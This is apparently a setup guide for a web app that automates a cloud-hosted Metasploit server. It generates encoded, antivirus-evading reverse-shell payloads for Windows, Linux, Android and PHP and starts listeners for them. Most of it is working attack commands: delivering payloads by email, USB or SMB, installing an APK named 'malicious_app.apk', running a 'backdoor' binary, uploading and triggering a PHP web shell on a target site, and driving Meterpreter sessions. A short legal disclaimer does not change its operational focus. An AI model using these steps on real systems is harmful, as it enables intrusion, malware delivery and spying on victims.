# 🚀 Automated GCP Metasploit - Complete Setup

## Overview

You now have **TWO ways** to use Metasploit in your app:

### 1. 🎯 **Easy Mode** (Recommended for most users)
- `/metasploit-easy.html` - Simple 3-step wizard
- One-click payload generation
- Automatic listener setup
- No command line needed

### 2. ⚡ **Advanced Mode** (For power users)
- `/metasploit.html` - Full control interface
- Custom encoders and iterations
- Manual listener configuration
- All Metasploit options

Both modes are powered by a **GCP-hosted Metasploit server** that handles everything automatically.

---

## 🎬 Quick Start (5 Minutes)

### Step 1: Deploy GCP Server

```bash
cd /Users/admin/atoms

# Deploy to Google Cloud
./gcp-metasploit-deploy.sh
```

**What this does:**
- Creates a GCP instance
- Installs Metasploit Framework
- Sets up REST API
- Configures firewall rules
- Returns your server IP

**Output will look like:**
```
╔════════════════════════════════════════════════════════════╗
║          🎯 Metasploit Server Ready!                      ║
╚════════════════════════════════════════════════════════════╝

📡 Server IP: 34.123.45.67
🔗 API URL: http://34.123.45.67:3001
```

### Step 2: Wait for Installation

The server needs ~10 minutes to install Metasploit. Monitor progress:

```bash
# Check status anytime
./gcp-metasploit-status.sh

# Or manually check
curl http://YOUR_SERVER_IP:3001/health
```

### Step 3: Update Frontend

Edit `/config.js` or your frontend code:

```javascript
const appConfig = {
    KALI_MCP_ENDPOINT: 'http://YOUR_SERVER_IP:3001'
};
```

### Step 4: Start Using!

Navigate to:
- **Easy Mode**: `https://www.atoms.ninja/metasploit-easy.html`
- **Advanced Mode**: `https://www.atoms.ninja/metasploit.html`

---

## 🎯 Easy Mode Usage

### Interface Flow:

**Step 1: Choose Platform**
```
💻 Windows    🐧 Linux
📱 Android    🌐 PHP
```
Click your target platform

**Step 2: Auto-Configure**
- Your IP: `Detected automatically`
- Encoding: `☑ Enable AV evasion`
- Click "Generate"

**Step 3: Get Results**
```
📦 Payload: payload_windows_1234.exe
📥 Download button
🎧 Listener: Active on port 4444
```

---

## 📡 API Usage

### One Command Setup (Easiest!)

```bash
# Replace with your server IP
SERVER_IP="34.123.45.67"

curl -X POST http://$SERVER_IP:3001/api/quick-setup \
  -H 'Content-Type: application/json' \
  -d "{
    \"platform\": \"windows\",
    \"lhost\": \"$SERVER_IP\",
    \"lport\": 4444,
    \"encode\": true
  }"
```

**Response:**
```json
{
  "success": true,
  "payload": {
    "name": "payload_windows_1731551234.exe",
    "size": 73802,
    "downloadUrl": "/api/payload/download/payload_windows_1731551234.exe"
  },
  "listener": {
    "status": "starting",
    "lport": 4444
  },
  "jobId": 1731551234,
  "instructions": {
    "download": "curl http://34.123.45.67:3001/api/payload/download/... -o payload.exe",
    "deliver": "Transfer to target",
    "execute": "Run on target",
    "monitor": "curl http://34.123.45.67:3001/api/listener/status/1731551234"
  }
}
```

### Download Payload

```bash
# From the response, use downloadUrl
curl http://$SERVER_IP:3001/api/payload/download/payload_windows_1731551234.exe \
  -o payload.exe

ls -lh payload.exe
# -rw-r--r-- 1 user staff 72K payload.exe
```

### Check Sessions

```bash
# Use jobId from quick-setup response
curl http://$SERVER_IP:3001/api/listener/status/1731551234 | jq '.'
```

---

## 🎓 Complete Example Workflow

### Scenario: Windows Exploitation

**1. Generate Everything**
```bash
SERVER_IP="34.123.45.67"

RESULT=$(curl -s -X POST http://$SERVER_IP:3001/api/quick-setup \
  -H 'Content-Type: application/json' \
  -d "{
    \"platform\": \"windows\",
    \"lhost\": \"$SERVER_IP\",
    \"lport\": 4444,
    \"encode\": true
  }")

echo "$RESULT" | jq '.'
```

**2. Extract Info**
```bash
PAYLOAD_NAME=$(echo "$RESULT" | jq -r '.payload.name')
JOB_ID=$(echo "$RESULT" | jq -r '.jobId')

echo "Payload: $PAYLOAD_NAME"
echo "Job ID: $JOB_ID"
```

**3. Download Payload**
```bash
curl "http://$SERVER_IP:3001/api/payload/download/$PAYLOAD_NAME" \
  -o payload.exe

file payload.exe
# payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

**4. Deliver to Target**
```bash
# Option A: Simple HTTP server
python3 -m http.server 8000
# Target visits: http://YOUR_IP:8000/payload.exe

# Option B: Email attachment
# Option C: USB drive
# Option D: SMB share
```

**5. Monitor for Connection**
```bash
# Watch for sessions
watch -n 5 "curl -s http://$SERVER_IP:3001/api/listener/status/$JOB_ID | jq '.log' | tail -20"
```

**6. Interact with Session**
```bash
# SSH into GCP server
gcloud compute ssh metasploit-server --zone=us-central1-a

# Start msfconsole
msfconsole

# List sessions
msf> sessions -l

# Interact
msf> sessions -i 1

# You now have meterpreter!
meterpreter> sysinfo
meterpreter> getuid
meterpreter> screenshot
```

---

## 🔧 Platform-Specific Examples

### Android APK
```bash
curl -X POST http://$SERVER_IP:3001/api/quick-setup \
  -d '{"platform":"android","lhost":"'$SERVER_IP'","lport":4444,"encode":false}'

# Download APK
curl http://$SERVER_IP:3001/api/payload/download/payload_android_*.apk \
  -o malicious_app.apk

# Install on target device
adb install malicious_app.apk
```

### Linux Server
```bash
curl -X POST http://$SERVER_IP:3001/api/quick-setup \
  -d '{"platform":"linux","lhost":"'$SERVER_IP'","lport":4444,"encode":true}'

# Download ELF
curl http://$SERVER_IP:3001/api/payload/download/payload_linux_*.elf \
  -o backdoor

# On target Linux:
chmod +x backdoor
./backdoor &
```

### PHP Web Shell
```bash
curl -X POST http://$SERVER_IP:3001/api/quick-setup \
  -d '{"platform":"php","lhost":"'$SERVER_IP'","lport":4444,"encode":false}'

# Download PHP file
curl http://$SERVER_IP:3001/api/payload/download/payload_php_*.php \
  -o shell.php

# Upload to vulnerable web server
curl -F "file=@shell.php" http://target.com/upload.php

# Access it to trigger connection
curl http://target.com/uploads/shell.php
```

---

## 🛠️ Management Commands

### Check Server Status
```bash
./gcp-metasploit-status.sh
```

### View API Logs
```bash
gcloud compute ssh metasploit-server --zone=us-central1-a \
  --command='journalctl -u metasploit-api -f'
```

### List Active Listeners
```bash
curl http://$SERVER_IP:3001/api/listener/list | jq '.'
```

### Stop Server (Save Money!)
```bash
gcloud compute instances stop metasploit-server --zone=us-central1-a
```

### Start Server
```bash
gcloud compute instances start metasploit-server --zone=us-central1-a
```

### Delete Everything
```bash
gcloud compute instances delete metasploit-server --zone=us-central1-a --quiet
gcloud compute firewall-rules delete metasploit-api --quiet
gcloud compute firewall-rules delete metasploit-listeners --quiet
```

---

## 💰 Cost Estimation

### Server Costs (GCP)
- **e2-micro**: ~$7/month (minimal testing)
- **e2-standard-2**: ~$50/month (recommended)
- **n1-standard-4**: ~$140/month (heavy usage)

### Cost Saving Tips:
1. **Stop when not in use**: Only pay for running time
2. **Use preemptible instances**: 80% cheaper
3. **Set auto-shutdown**: Scheduled stop after hours
4. **Use committed use discounts**: 37% off for 1-year commit

---

## 🔒 Security Considerations

### 1. Restrict API Access
```bash
# Only allow your IP
gcloud compute firewall-rules update metasploit-api \
  --source-ranges YOUR_IP/32
```

### 2. Enable HTTPS
```bash
# On server
certbot --nginx -d metasploit.yourdomain.com
```

### 3. Add Authentication
Edit `/opt/metasploit-api/server.js` on server:
```javascript
const API_KEY = process.env.API_KEY || 'your-secret-key';

app.use((req, res, next) => {
    if (req.headers['x-api-key'] !== API_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
});
```

### 4. Regular Updates
```bash
# SSH into server
gcloud compute ssh metasploit-server

# Update Metasploit
msfupdate

# Update system
apt update && apt upgrade -y
```

---

## 🐛 Troubleshooting

### API Not Responding
```bash
# Check if running
./gcp-metasploit-status.sh

# Restart service
gcloud compute ssh metasploit-server \
  --command='sudo systemctl restart metasploit-api'
```

### Payload Not Connecting
```bash
# Check firewall on target
# Check listener is running
curl http://$SERVER_IP:3001/api/listener/list

# Test connectivity from target
# On target: telnet YOUR_IP 4444
```

### Sessions Not Showing
```bash
# SSH into server and check
gcloud compute ssh metasploit-server

# Start msfconsole manually
msfconsole

# Check database
msf> db_status
msf> sessions -l
```

---

## 📚 Files Overview

### New Files Created:
```
✅ gcp-metasploit-deploy.sh      - Deployment script
✅ gcp-metasploit-status.sh      - Status checker
✅ metasploit-easy.html           - Easy mode interface
✅ GCP_METASPLOIT_EASY.md         - Detailed guide
✅ GCP_METASPLOIT_AUTOMATION.md   - This file
```

### Modified Files:
```
✅ metasploit.html                - Added Easy Mode link
✅ index.html                     - Added Easy Mode link
```

---

## 🎓 Next Steps

### 1. Immediate Use
```bash
# Deploy server
./gcp-metasploit-deploy.sh

# Wait for installation (~10 min)
./gcp-metasploit-status.sh

# Update your frontend
# Visit /metasploit-easy.html
# Start exploiting!
```

### 2. Optional Enhancements
- Add SSL/HTTPS support
- Setup domain name
- Add authentication
- Create webhook for session notifications
- Build mobile app interface

### 3. Advanced Features
- Real-time session updates (WebSockets)
- Meterpreter command execution from UI
- File upload/download interface
- Screenshot viewer
- Automated post-exploitation

---

## 📖 Documentation

- **Easy Mode Guide**: `GCP_METASPLOIT_EASY.md`
- **Metasploit Commands**: `METASPLOIT_GUIDE.md`
- **Setup Summary**: `METASPLOIT_SETUP_COMPLETE.md`
- **Original Setup**: `METASPLOIT_SETUP_COMPLETE.md`

---

## ⚠️ Legal Disclaimer

**CRITICAL**: This tool is for **authorized security testing ONLY**.

✅ **Allowed**: Testing your own systems, client systems with written permission
❌ **Illegal**: Unauthorized access, testing without permission, malicious use

Unauthorized access to computer systems is **ILLEGAL** in most jurisdictions and can result in criminal prosecution.

**Use responsibly and ethically!**

---

## 🎉 Summary

You now have:

✅ **Automated GCP deployment** - One command setup
✅ **Easy Mode interface** - 3-step wizard for exploits
✅ **Advanced Mode interface** - Full Metasploit control
✅ **REST API** - Programmatic access
✅ **One-click payloads** - Generate in seconds
✅ **Auto listeners** - Start automatically  
✅ **Direct downloads** - Get payloads easily
✅ **Session management** - Track active connections
✅ **Status monitoring** - Check health anytime
✅ **Cost efficient** - Stop when not needed

**Ready to use!** 🚀

Deploy: `./gcp-metasploit-deploy.sh`
Status: `./gcp-metasploit-status.sh`
Use: Visit `/metasploit-easy.html`

Happy (ethical) hacking! 🥷💻🔒
